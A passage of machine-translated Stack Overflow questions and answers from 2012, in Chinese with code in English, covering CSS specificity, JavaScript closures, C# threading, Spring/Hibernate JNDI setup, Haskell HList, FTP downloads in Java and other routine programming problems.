`c.gearRatio`指 和 中的齿轮`Car`比`not from SportsCar`。在方法的情况下`c.accelerate()`，方法被覆盖`SportsCar`并且它是`SportsCar`对象，所以`SportsCar.accelerate()`被调用。

```
public static void main(String args[ ] ){
  A o1 = new C( );  // object reference is of type A and object is C
  B o2 = (B) o1;   // object of C can be type casted to B as B is parent to C
  System.out.println(o1.m1( ) ); // C.m1() will be called.  
  System.out.println(o2.i );   // o2 is type B, so B.i will be printed
} 
```

# javascript - 覆盖来自外部源的 td 标签样式

> ID：12078753
> 
> 赞同：0
> 
> 时间：2012-08-22T17:55:06.933
> 
> 标签：javascript, html, css, css-selectors

美好的一天......是的，我是一个noob。因此，我为我的无名之辈道歉。我已经搜索了这个网站，很多人都喜欢它一个星期，但没有任何解决方案。我相信我的问题是独一无二的。

我有一个包含大约 10 个页面的网站，我正在创建其中有很多很多表格。大多数表格的格式都相同，所以我立即使用 CSS 来满足我的需要。

所以现在我正在尝试理解 CSS 和选择器以及如何组合它们等。

这是我的困境。我为标签创建了一个标签样式，`<td>`它在我所做的大约 95% 的事情上都非常有效。当我想左对齐并缩进时，我还为这些实例创建了一个“覆盖”类`<td>`：

```
TD {                
            text-align: center;
            vertical-align: middle;
            all other rules;}

td.overide_l {
            text-align: left;
            vertical-align: middle;
            padding-left: 1em;
            all other rules;} 
```

我的问题来自一个公司控制的 javascript，它创建了一个左侧导航菜单。显然，该代码中有受我的规则影响的 td。问题是 javascript 不是我可以更改的东西。这是保存在公司网站上的公司脚本，但需要在我的每个页面上。

如果我将`<td>`样式更改为左对齐，则脚本将左对齐。如果我一起删除`<td>`标签，它将向左对齐。如果我让`<td>`样式中心像我想要的那样对齐，脚本中心对齐左导航，我不能覆盖它。

我已经尝试了一千件事。我试图将脚本放在一个单独的表中，其中包含类覆盖，我尝试将它放在一个单独的包围它的 td 中，我将 class="overide_l" 类放在`<span>`.

最后，我尝试创建`<div>`与 id 相关联的 's ，但随后我的 Class="overide_l" （以及我创建的大量其他类样式）在新 div 中不再工作......

```
div#content-section td {
            text-align: center;
            vertical-align: middle;} 
```

最终，我想做的是将标签样式保留在本文顶部，并简单地创建一个`<div>`或其他东西来关闭`<td>`那段代码的标签样式。这甚至可能吗？

你能帮我么！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:59:23.827

你不能`td`用你的覆盖类做你对选择器所做的同样的事情吗？

```
#content-section td.overide_l {
  text-align: left;
  vertical-align: middle;
  padding-left: 1em;
} 
```

问题是特异性：

*   ID 选择器 100 分

*   类选择器 10 分

*   1 用于标签选择器

如果将选择器相加，您将获得优先的选择器。

在你的情况下：

`td.overide_l`=`11`

`div#content-section td`=`102`

所以第二个赢了。改成`td.overide_l`会`#content-section td.overide_l`成功`111`的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:58:58.480

您需要在这里做的是在您的 css 规则中更加具体。出于您在此处说明的原因，对所有元素 (td) 设置规则是一个坏主意。让代码中的表格具有不同的类，以便您的 CSS 规则知道它们与导航 tds 之间的区别。另外，如果你们经常使用桌子，你们会度过一段糟糕的时光。

# windows-phone-7 - 学习Windows Phone 7开发学习Windows 8有意义吗？

> ID：12078754
> 
> 赞同：1
> 
> 时间：2012-08-22T17:55:12.037
> 
> 标签：windows-phone-7, windows-8

我想学习 Windows 8 开发（专门针对智能手机），但现在无法安装 Windows 8 发布预览版。并且互联网上有更多关于带有 SDK 7 的 Windows Phone 的信息、教程等。

我对Windows开发一无所知。带有 SDK 7 的 Windows Phone 是 Windows 8 的良好基础吗？还是我会浪费我的时间，最好等待并直接从 Windows 8 开始？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T22:08:21.160

I would say yes. Whether you choose the XAML/C# route or the HTML/JS route, you're not going to learn much while studying Win Phone 7 development that doesn't apply to Win Phone 8 development and even Win 8 development.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:11:00.297

好吧，至少按照这篇文章来说，虽然不是主要讲开发，但是差别太大了，把Windows(phone) 7当作“入门”来学习可能没什么意义。

[http://crave.cnet.co.uk/mobiles/windows-phone-7-was-doomed-by-design-microsoft-admits-50008466/](http://crave.cnet.co.uk/mobiles/windows-phone-7-was-doomed-by-design-microsoft-admits-50008466/)

另一方面，微软网站上有这篇文章：

[http://msdn.microsoft.com/en-US/library/windows/apps/hh465136](http://msdn.microsoft.com/en-US/library/windows/apps/hh465136)

这清楚地表明有一个重要的共同基础，因为这些应用程序应该很容易移植。嗯...会看到:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T19:58:04.643

如果您不致力于 Silverlight，您可以只为 Windows 8 应用程序采用 HTML5 路线。然后，您现在可以开始学习 HTML5，而无需安装 Windows 8。

由于您对 Windows 开发一无所知，我会说学习 HTML5，然后您可以在 Web 以及 Windows 8 应用程序上使用它。

[在 Microsoft 的 GenerationApp 网站 - http://bit.ly/30tolaunch](http://bit.ly/30tolaunch)上有一系列很棒的自学练习。免费，非常适合初学者入门。

# c# - 如何在单独的线程中打开第二个 UI

> ID：12078758
> 
> 赞同：2
> 
> 时间：2012-08-22T17:55:32.863
> 
> 标签：c#, multithreading

我正在与一个团队合作开发一个具有报告生成器和报告查看器的应用程序。目前，我们无法在单独的线程中打开报表查看器。这两个应用程序一旦打开应该是独立的，如果一个被关闭，它不应该影响另一个。

报告查看器有一组 UI 文件，而主 UI 有另一组文件。我的问题是，一旦主 UI 回到“空闲”状态（不隐藏，只是不处理任何东西），我们如何在单独的线程中打开查看器 UI？

任何简短的代码片段都会有所帮助，此时我完全不知道如何在新线程中打开查看器......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:03:13.267

也许是这样的：

```
private void MethodName {
System.Threading.Thread t = new System.Threading.Thread(new System.Threading.ThreadStart(ThreadProc));
        t.Start();
} 
```

代码将`ThreadProc`如下所示：

```
public static void ThreadProc()
    {
        Application.Run(new Application_Name());            
    } 
```

MethodName（对我来说）实际上是

```
serverToolStripMenuItem_Click(object sender, EventArgs e) 
```

因为它是事件驱动的代码。

`Application_Name`将是您要运行的表单或应用程序。

希望这可以帮助。

# javascript - 尝试在 foreach 循环中将变量传递到对象的方法构造函数时的范围问题

> ID：12078763
> 
> 赞同：2
> 
> 时间：2012-08-22T17:55:46.467
> 
> 标签：javascript, jquery

我了解以下代码块中发生了什么，但不确定如何修复它：

```
for (var i = 0; i < songs.length; i++){
    var listItem = $('<li/>').appendTo(songList);

    var song = songs[i];

    var link = $('<a/>', {
        id: song.id,
        href: '#' + song.id,
        text: song.name,
        contextmenu: function(e){
            var contextMenu = new ContextMenu(song);
            contextMenu.show(e.pageY, e.pageX);

            //Prevent default context menu display.
            return false;
        }
    }).appendTo(listItem);
} 
```

在这种情况下，当在 contextmenu 方法中访问歌曲时，歌曲将始终是 foreach 循环中迭代的最后一项。我想知道如何使链接与其定义歌曲之间存在 1:1 的关系。

我尝试将歌曲对象分配为链接对象的属性（通过 this.song 访问），但它显示为未定义。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:00:12.753

```
for (var i = 0; i < songs.length; i++){
    // note this
    (function(i) {
        var listItem = $('<li/>').appendTo(songList);

        var song = songs[i];

        var link = $('<a/>', {
            id: song.id,
            href: '#' + song.id,
            text: song.name,
            contextmenu: function(e){
                var contextMenu = new ContextMenu(song);
                contextMenu.show(e.pageY, e.pageX);

                //Prevent default context menu display.
                return false;
            }
        }).appendTo(listItem);
    // and this
    }(i));
} 
```

请参阅[此副本](https://stackoverflow.com/questions/750486/javascript-closure-inside-loops-simple-practical-example)以获取解释。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T18:02:10.713

另一个答案是更好的方法——将对象声明在`for`循环范围之外。但是，如果必须在 for 循环中声明对象，以下是解决问题的方法：

`song`从您的 contextMenu 函数声明了一级范围。因此，每当 contextMenu 执行时，它都会查找作用域链，直到找到变量，此时它总是会找到最后一个实例化的歌曲。您需要获取一份可用于 contextMenu 的歌曲副本，这也很棘手，因为对象在 JavaScript 中是通过引用传递的。您可以将自调用函数与 $.extend 结合使用来复制`song`（`newSong`在我的示例中重命名）并解决此问题：

```
for (var i = 0; i < songs.length; i++){
    var listItem = $('<li/>').appendTo(songList);

    var song = songs[i];

    var link = $('<a/>', {
        id: song.id,
        href: '#' + song.id,
        text: song.name,
        contextmenu: (function(song){
            var newSong = $.extend(true,{},song);
            return function(e) {
            var contextMenu = new ContextMenu(newSong);
            contextMenu.show(e.pageY, e.pageX);

            //Prevent default context menu display.
            return false;
          };
        })(song);
    }).appendTo(listItem);
} 
```

# java - 使用 GWT 时不相关的 Google App Engine API？

> ID：12078765
> 
> 赞同：0
> 
> 时间：2012-08-22T17:55:50.367
> 
> 标签：java, google-app-engine, gwt, pagespeed, channel-api

我一直在阅读 GAE 和 GWT，似乎如果您将 GWT 应用程序部署到 GAE，那么以下 API 是不必要的：

*   页面速度
*   频道 API

由于 GWT 已经对所有客户端代码进行了超级优化，并且包括所有必要的 AJAX 机制来生成“单页 Web 应用程序”，所以在我看来，在将 GWT 应用程序部署到 GAE 时可以忽略这两者。

我对这两个 API 的*理解*是 PageSpeed 有助于优化客户端代码（GWT 已经这样做了），并且 Channel API 用于长轮询（GWT 已过时）。

如果我不正确，请帮助我理解原因。或者，帮助说明 GWT 应用程序仍可从这些 API 中受益的场景。提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T06:57:40.787

我不认为它们是完全无关的。

*   `PageSpeed`: 老实说，我没有太多经验`PageSpeed`。GWT 做了很多优化以确保快速加载资源（免责声明：如果您正在使用`ClientBundle`）。因此，当您`PageSpeed`为您的 GWT 应用程序激活时，您可能看不到多少速度提升。但是根据文档，它说：

> PageSpeed 服务不会向您的用户提供陈旧的 HTML。通常，呈现页面所需的 95% 字节是可缓存的，但 HTML 本身不是。PageSpeed 服务通过缓存页面的可缓存部分（以及其他技术）来加速页面的加载。这包括图像、JavaScript 和 CSS 等资源。请参阅有关控制 PageSpeed 服务缓存哪些资源的信息。

因此，您可能可以通过配置为静态资源提供服务的 Web 服务器来自己缓存静态资源，但我想`PageSpeed`开箱即用会为您做到这一点。此外，谷歌似乎会预取资源，然后从他们的服务器提供它们，与`GAE`.
我建议尝试一下，看看它有多大帮助。

*   `Channel API`: Channel API 可能对您的 GWT 应用程序非常有用。与传统的 AJAX 调用相比，长轮询具有不同的用例。例如，如果您想在 GWT 中创建一个基于 Web 的聊天应用程序，您可以使用它`Channel API`来支持客户端和后端之间的“实时”通信。
    所以`Channel API`肯定有它的用例，尽管 90% 的时间你可能会使用普通的 AJAX 调用。

# ruby-on-rails - Ruby 包括来自 Amazon S3 的图像

> ID：12078770
> 
> 赞同：0
> 
> 时间：2012-08-22T17:56:14.047
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, refinerycms

这是我网站上的 ruby​​ 代码，在本地运行良好：

```
 <% slika = Refinery::Page.find('torte-za-rodendan') %>
        <%= link_to (slika), :class => "hp_product" do %>   
        <%= image_tag slika.key_image.url, :width=>"154", :height=>"100"  %>
        <h2>Za rođendan</h2>  <!-- <%= slika.title %> -->
<% end %> 
```

问题是 - 我必须给它一个指向上传到 Amazon S3 上的图片的链接，以便用户可以在全球范围内查看图片。

谁能给我建议，我该如何修改我的代码以实现这一目标？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:14:57.347

问题已解决 - 一切都通过 S3 Amazon 配置解决

# java - Spring-hibernate：通过tomcat jndi的数据源

> ID：12078780
> 
> 赞同：1
> 
> 时间：2012-08-22T17:56:54.133
> 
> 标签：java, spring, hibernate, tomcat, jndi

看起来问题很老，但我找不到正确的解决方案。

细节：

web.xml

```
 <resource-ref>
    <res-ref-name>jdbc/jndisqldbhello</res-ref-name>
    <res-type>javax.sql.DataSource</res-type>
    <res-auth>Container</res-auth>
</resource-ref> 
```

上下文.xml

```
<Context>
<Resource name="jdbc/jndisqldbhello"
    auth="Container"
    type="javax.sql.DataSource"
    factory="org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory"
    maxActive="10"
    maxIdle="5"
    maxWait="10000"
    username="root"
    password="123456"
    driverClassName="com.mysql.jdbc.Driver"
    url="jdbc:mysql://localhost:3306/javatest"
    validationQuery="select 1"/>
</Context> 
```

应用程序上下文.xml

```
<jee:jndi-lookup jndi-name="jdbc/jndisqldbhello" id="dataSource" />
    <bean class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean" id="entityManagerFactory">
    <property name="dataSource" ref="dataSource" />
</bean> 
```

持久性.xml

```
<persistence xmlns="http://java.sun.com/xml/ns/persistence"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://java.sun.com/xml/ns/persistence 
http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd"
version="2.0">
<persistence-unit name="persistenceUnit" transaction-type="RESOURCE_LOCAL">
    <provider>org.hibernate.ejb.HibernatePersistence</provider>
    <properties>
        <property name="hibernate.dialect" value="org.hibernate.dialect.MySQLDialect" />
        <property name="hibernate.show_sql" value="true" />
        <property name="hibernate.format_sql" value="true" />
        <property name="hibernate.ejb.naming_strategy" value="org.hibernate.cfg.ImprovedNamingStrategy"/>
    </properties>
</persistence-unit>
</persistence> 
```

无例外地启动 TOMCAT，但我对关于 NULL 定义的对象的警告感到困惑：

```
2011-04-08 20:32:30,311 - INFO ContextLoader - Root WebApplicationContext: initialization started
2011-04-08 20:32:30,576 - INFO XmlWebApplicationContext - Refreshing Root WebApplicationContext: startup date [Fri Apr 08 20:32:30 EEST 2011]; root of context hierarchy
2011-04-08 20:32:30,770 - INFO XmlBeanDefinitionReader - Loading XML bean definitions from class path resource [META-INF/spring/applicationContext.xml]
***2011-04-08 20:32:33,082 - INFO XmlWebApplicationContext - Bean 'dataSource' of type [class org.springframework.jndi.JndiObjectFactoryBean] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)***
***2011-04-08 20:32:33,087 - INFO XmlWebApplicationContext - Bean 'dataSource' of type [class org.apache.tomcat.dbcp.dbcp.BasicDataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)***
2011-04-08 20:32:33,139 - INFO LocalContainerEntityManagerFactoryBean - Building JPA container EntityManagerFactory for persistence unit 'persistenceUnit'
2011-04-08 20:32:33,687 - INFO Version - HCANN000001: Hibernate Commons Annotations {4.0.1.Final}
2011-04-08 20:32:33,716 - INFO Version - HHH000412: Hibernate Core {4.1.5.Final}
2011-04-08 20:32:33,730 - INFO Environment - HHH000206: hibernate.properties not found
2011-04-08 20:32:33,738 - INFO Environment - HHH000021: Bytecode provider name : javassist
2011-04-08 20:32:33,920 - INFO Ejb3Configuration - HHH000204: Processing PersistenceUnitInfo [
    name: persistenceUnit
    ...]
2011-04-08 20:32:34,738 - INFO ConnectionProviderInitiator - HHH000130: Instantiating explicit connection provider: org.hibernate.ejb.connection.InjectedDataSourceConnectionProvider
***2011-04-08 20:32:34,836 - WARN JdbcServicesImpl - HHH000342: Could not obtain connection to query metadata : Cannot create JDBC driver of class '' for connect URL 'null'***
2011-04-08 20:32:34,865 - INFO Dialect - HHH000400: Using dialect: org.hibernate.dialect.MySQLDialect
***2011-04-08 20:32:34,903 - INFO LobCreatorBuilder - HHH000422: Disabling contextual LOB creation as connection was null***
2011-04-08 20:32:34,952 - INFO TransactionFactoryInitiator - HHH000268: Transaction strategy: org.hibernate.engine.transaction.internal.jdbc.JdbcTransactionFactory
2011-04-08 20:32:34,972 - INFO ASTQueryTranslatorFactory - HHH000397: Using ASTQueryTranslatorFactory
2011-04-08 20:32:35,193 - INFO Version - HV000001: Hibernate Validator 4.3.0.Final
***2011-04-08 20:32:36,437 - INFO XmlWebApplicationContext - Bean 'entityManagerFactory' of type [class org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)***
2011-04-08 20:32:36,511 - INFO DefaultListableBeanFactory - Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@f474205: defining beans [org.springframework.beans.factory.config.PropertyPlaceholderConfigurer#0,org.springframework.context.config.internalBeanConfigurerAspect,userRepository,org.springframework.data.repository.core.support.RepositoryInterfaceAwareBeanPostProcessor#0,org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor#0,org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor#0,mySimpleDBService,org.springframework.context.annotation.internalConfigurationAnnotationProcessor,org.springframework.context.annotation.internalAutowiredAnnotationProcessor,org.springframework.context.annotation.internalRequiredAnnotationProcessor,org.springframework.context.annotation.internalCommonAnnotationProcessor,org.springframework.context.annotation.internalPersistenceAnnotationProcessor,transactionManager,org.springframework.transaction.config.internalTransactionAspect,entityManagerFactory,dataSource,org.springframework.context.annotation.ConfigurationClassPostProcessor$ImportAwareBeanPostProcessor#0]; root of factory hierarchy
2011-04-08 20:32:37,004 - INFO ContextLoader - Root WebApplicationContext: initialization completed in 6692 ms
апр 08, 2011 8:32:37 PM org.apache.catalina.core.ApplicationContext log
INFO: Initializing Spring FrameworkServlet 'webapp'
2011-04-08 20:32:37,107 - INFO DispatcherServlet - FrameworkServlet 'webapp': initialization started
2011-04-08 20:32:37,120 - INFO XmlWebApplicationContext - Refreshing WebApplicationContext for namespace 'webapp-servlet': startup date [Fri Apr 08 20:32:37 EEST 2011]; parent: Root WebApplicationContext
2011-04-08 20:32:37,126 - INFO XmlBeanDefinitionReader - Loading XML bean definitions from ServletContext resource [/WEB-INF/webapp-servlet.xml]
2011-04-08 20:32:37,459 - INFO DefaultListableBeanFactory - Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@654309f0: defining beans [restExampleController,org.springframework.context.annotation.internalConfigurationAnnotationProcessor,org.springframework.context.annotation.internalAutowiredAnnotationProcessor,org.springframework.context.annotation.internalRequiredAnnotationProcessor,org.springframework.context.annotation.internalCommonAnnotationProcessor,org.springframework.context.annotation.internalPersistenceAnnotationProcessor,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#0,org.springframework.format.support.FormattingConversionServiceFactoryBean#0,org.springframework.validation.beanvalidation.LocalValidatorFactoryBean#0,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#0,org.springframework.web.servlet.handler.MappedInterceptor#0,org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver#0,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver#0,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver#0,org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.view.InternalResourceViewResolver#0,org.springframework.context.annotation.ConfigurationClassPostProcessor$ImportAwareBeanPostProcessor#0]; parent: org.springframework.beans.factory.support.DefaultListableBeanFactory@f474205
2011-04-08 20:32:37,696 - INFO RequestMappingHandlerMapping - Mapped "{[/test/hi],methods=[GET],params=[],headers=[],consumes=[],produces=[],custom=[]}" onto public java.lang.String com.first.web.controller.RestExampleController.getHi()
2011-04-08 20:32:37,697 - INFO RequestMappingHandlerMapping - Mapped "{[/test/hello],methods=[GET],params=[],headers=[],consumes=[],produces=[],custom=[]}" onto public java.lang.String com.first.web.controller.RestExampleController.getMovies(org.springframework.ui.ModelMap)
2011-04-08 20:32:38,992 - INFO DispatcherServlet - FrameworkServlet 'webapp': initialization completed in 1884 ms
апр 08, 2011 8:32:39 PM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler ["http-bio-8080"] 
```

它开始时没有例外，但我相信我会得到它们。如果我添加到**persistance.xml**

```
<property name="hibernate.hbm2ddl.auto" value="update"/> 
```

我有例外：

```
 2011-04-08 20:50:17,160 - INFO Version - HV000001: Hibernate Validator 4.3.0.Final
2011-04-08 20:50:18,221 - INFO SchemaUpdate - HHH000228: Running hbm2ddl schema update
2011-04-08 20:50:18,222 - INFO SchemaUpdate - HHH000102: Fetching database metadata
2011-04-08 20:50:18,227 -ERROR SchemaUpdate - HHH000319: Could not get database metadata
org.apache.tomcat.dbcp.dbcp.SQLNestedException: Cannot create JDBC driver of class '' for connect URL 'null'
    at org.apache.tomcat.dbcp.dbcp.BasicDataSource.createConnectionFactory(BasicDataSource.java:1452)
    at org.apache.tomcat.dbcp.dbcp.BasicDataSource.createDataSource(BasicDataSource.java:1371)
    at org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection(BasicDataSource.java:1044)
    at org.hibernate.ejb.connection.InjectedDataSourceConnectionProvider.getConnection(InjectedDataSourceConnectionProvider.java:70)
    at org.hibernate.tool.hbm2ddl.SuppliedConnectionProviderConnectionHelper.prepare(SuppliedConnectionProviderConnectionHelper.java:51)
    at org.hibernate.tool.hbm2ddl.SchemaUpdate.execute(SchemaUpdate.java:194)
    at org.hibernate.tool.hbm2ddl.SchemaUpdate.execute(SchemaUpdate.java:178)
    at org.hibernate.internal.SessionFactoryImpl.<init>(SessionFactoryImpl.java:492)
    ....
2011-04-08 20:50:18,238 -ERROR SchemaUpdate - HHH000299: Could not complete schema update
org.apache.tomcat.dbcp.dbcp.SQLNestedException: Cannot create JDBC driver of class '' for connect URL 'null'
    at org.apache.tomcat.dbcp.dbcp.BasicDataSource.createConnectionFactory(BasicDataSource.java:1452)
    at org.apache.tomcat.dbcp.dbcp.BasicDataSource.createDataSource(BasicDataSource.java:1371)
    at org.apache.tomcat.dbcp.dbcp.BasicDataSource.getConnection(BasicDataSource.java:1044)
    at org.hibernate.ejb.connection.InjectedDataSourceConnectionProvider.getConnection(InjectedDataSourceConnectionProvider.java:70)
    at org.hibernate.tool.hbm2ddl.SuppliedConnectionProviderConnectionHelper.prepare(SuppliedConnectionProviderConnectionHelper.java:51) 
```

谁能帮我理解它应该如何修复，好吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-23T16:18:32.267

似乎解决方案在最近的[主题](https://stackoverflow.com/questions/10800971/jndiexception-when-using-hibernate-4-0-with-tomcat-7-when-using-persistence-xml?rq=1)中。

[由于休眠问题](https://hibernate.onjira.com/browse/HHH-7012)，我第一次不清楚（不起作用）

我发现如果我在我的 persistence.xml 中使用一般问题就解决了

```
java://comp/env/jdbc/myDatabase 
```

例子

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<persistence xmlns="http://java.sun.com/xml/ns/persistence"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://java.sun.com/xml/ns/persistence 
http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd"
version="2.0">
<persistence-unit name="persistenceUnit" transaction-type="RESOURCE_LOCAL">
    <provider>org.hibernate.ejb.HibernatePersistence</provider>
    <non-jta-data-source>java://comp/env/jdbc/jndisqldbhello</non-jta-data-source>
    <properties>
        <property name="hibernate.dialect" value="org.hibernate.dialect.MySQLDialect" />
        <property name="hibernate.connection.datasource" value="java://comp/env/jdbc/jndisqldbhello"/>
        <property name="hibernate.show_sql" value="true" />
        <property name="hibernate.format_sql" value="true" />
        <property name="hibernate.ejb.naming_strategy" value="org.hibernate.cfg.ImprovedNamingStrategy"/>
    </properties>
</persistence-unit>
</persistence> 
```

但是如果我添加属性

```
<property name="hibernate.hbm2ddl.auto" value="create"/> 
```

这没用 （（（。

如果有任何建议，请通知我，谢谢。

# iphone - Iphone 视频播放器

> ID：12078783
> 
> 赞同：0
> 
> 时间：2012-08-22T17:57:03.370
> 
> 标签：iphone, ios

我正在创建基于视频的 ios 应用程序。我正在使用 MPMoviePlayerController 播放视频。它适用于本地视频文件，但我无法播放服务器链接的视频，请给我一些想法

这是我的代码

```
MPMoviePlayerController * player = [[MPMoviePlayerController alloc] init]; 
NSURL *url = [NSURL URLWithString:imageName];

player.scalingMode = MPMovieScalingModeFill;
[player setContentURL:url];
[player prepareToPlay];
[player play]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:16:34.633

如果您想使用`MPMoviePlayerController`服务器链接或流式传输的实现。

请参阅此示例代码。对你有很大帮助：[MoviePlayer](http://developer.apple.com/library/ios/#samplecode/MoviePlayer_iPhone/Introduction/Intro.html)

# javascript - removeEventListener 不参考事件处理程序

> ID：12078789
> 
> 赞同：4
> 
> 时间：2012-08-22T17:57:22.473
> 
> 标签：javascript, events, dom-events

我想知道是否可以在不引用应该删除的事件处理函数的情况下删除事件侦听器。

Jquery`$().unbind('touchmove')`将不起作用，因为事件侦听器是使用 Javascript 添加的`addEventListener('touchmove', handlerFunction)`，而不是 Jquery 的`bind`函数。

`removeEventListener('touchmove')`似乎不起作用，这与 Javascript 函数规范一致。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-03-14T06:19:54.953

您可以获取 DOM 元素的所有事件侦听器并删除一个/全部：

```
var eventlistener = getEventListeners(window)["DOMContentLoaded"][index];
window.removeEventListener("DOMContentLoaded", eventlistener.listener, eventlistener.useCapture); 
```

取自这个答案：[https ://stackoverflow.com/a/26845805/712700](https://stackoverflow.com/a/26845805/712700)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-30T22:00:25.143

您应该始终将事件添加到特定对象，以便以后可以访问它们，试试这个。

添加：

```
window.addEventHandler( 'touchmove', function ); 
```

去除：

```
window.removeEventListener( 'touchmove', function ); 
```

# game-physics - 二维摆的实现

> ID：12078790
> 
> 赞同：1
> 
> 时间：2012-08-22T17:57:23.300
> 
> 标签：game-physics

我在我的蠕虫类游戏中实现了用于绳索动作的 2d 钟摆，我最初打算使用角度公式，即`angleNow = maxAngle * cos( sqrt(g/length) * t)`，但问题在于我如何处理绳索中人的碰撞。现在我使用的是经典力学,我在计算每一瞬间的向心力，`centripetal = gravity_constant * cos(speed_angle) + pow(speed,2)/length`所以绳子里的人有两个力，一个是重力，另一个是向心力，一直在变化。我用公式 `deltaVelocity = acceleration * (time - this.lastTime)`来计算速度变化，这可能是问题，因为重力增量和向心增量的更新不一致。现在的问题是绳子的长度总是在变化，这不是钟摆，绳子倾向于向一侧走很远然后回来。

顺便说一句，游戏是基于网络的，我正在使用 javascript 来实现它，提前谢谢你。这是我用来计算向心的代码：

```
this.magnitude = (Math.pow(character.velocityX,2) + Math.pow(character.velocityY,2))/sprite.length;
            this.angle = Math.atan(character.velocityY/character.velocityX);
            this.delta =  GRAVITY_CONSTANT * Math.cos(this.angle);
            this.magnitude += this.delta;
            character.velocityX += this.magnitude * Math.sin(this.angle) * ((time - this.lastTime) /1000);
            character.velocityY -= this.magnitude * Math.cos(this.angle) * ((time - this.lastTime) /1000); 
```

# haskell - “现代”HList？

> ID：12078792
> 
> 赞同：30
> 
> 时间：2012-08-22T17:57:37.417
> 
> 标签：haskell, record

HList[包](http://hackage.haskell.org/package/HList-0.2.3)基于现在*古老*的Haskell 技术。一个简单的问题是：考虑到过去 8 年 Haskell/GHC 开发的所有精彩新特性，“现代”HList 的构建方式会非常不同吗？我意识到这里的答案很可能是**否定**的，对于 HList 的特定情况，当时使用的技术仍然会产生最优雅的解决方案。

我已经阅读了[可扩展记录](http://www.haskell.org/haskellwiki/Extensible_record)页面上记录的许多项目，唯一真正的竞争对手（即作为 hackage 上可用的库实现的一个）是[记录包](http://hackage.haskell.org/package/records)。[还是可扩展记录](http://www.haskell.org/haskellwiki/Extensible_record)中缺少链接？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-22T20:22:07.537

这些软件包中的任何一个的问题是其目标的范围。HList 实际上是 5 种不同的标签实现，两种类型相等，两种类型转换，两种 Record/RecordP，以及 Variant vs TIC 选择。所有这些都相似，但在易用性、可移植性和使用的扩展方面有所不同。

较新的 GHC 功能（GADT、关联类型、约束类型、多态类型、单例类型）可能允许稍有不同的权衡取舍。特别是单例类型可能允许更好的标签，而多态类型可能允许更优雅的 Typeable/Data/Generics 。

您链接到的“记录”包取决于声称的“种类”包：

> “Haskell 不支持子类和子类多态性。但是，这个包可以用来模拟子类 * 和子类变量。”

但由于在新的 GHC 版本中将数据类型提升为种类，这不再适用。所以这个 2012 年 1 月的软件包现在可能已经过时了。

至于记录，也许一个新系统将从最新一轮的多态镜头中汲取灵感：[镜头](http://hackage.haskell.org/package/lens)和/或[镜头系列](http://hackage.haskell.org/package/lens-family)。

# java - 通过 FTP 下载 XML 文件

> ID：12078794
> 
> 赞同：4
> 
> 时间：2012-08-22T17:57:42.713
> 
> 标签：java, ftp, windows-task-scheduler

我在数据库中有一个提要列表，用于从 FTP 服务器下载 XML 文件，然后对其进行解析。该脚本被捆绑到一个 jar 文件中，该文件每天使用 Windows 任务计划程序运行。有时，请求会在抓取某个 xml 文件时被拖走。到目前为止，它在 2 周内发生了大约 3 次，我看不到真正的模式。

当它出现问题时，我转到运行它的计算机，我看到命令窗口打开，并且在 xml 完全下载之前停止。如果我关闭命令窗口并手动运行任务，一切都会正常工作。

我用来下载 xml 文件的代码是：

```
private void loadFTPFile(String host, String username, String password, String filename, String localFilename){
        System.out.println(localFilename);
        FTPClient client = new FTPClient();
        FileOutputStream fos = null;

        try {
            client.connect(host);
            client.login(username, password);
            String localFilenameOutput = createFile(assetsPath + localFilename);
            fos = new FileOutputStream(localFilenameOutput);
            client.retrieveFile(filename, fos);

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (fos != null) 
                    fos.close();
                client.disconnect();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
```

这个函数在循环中被调用，当它失败时，一切都会停止，脚本不会进入下一个提要。

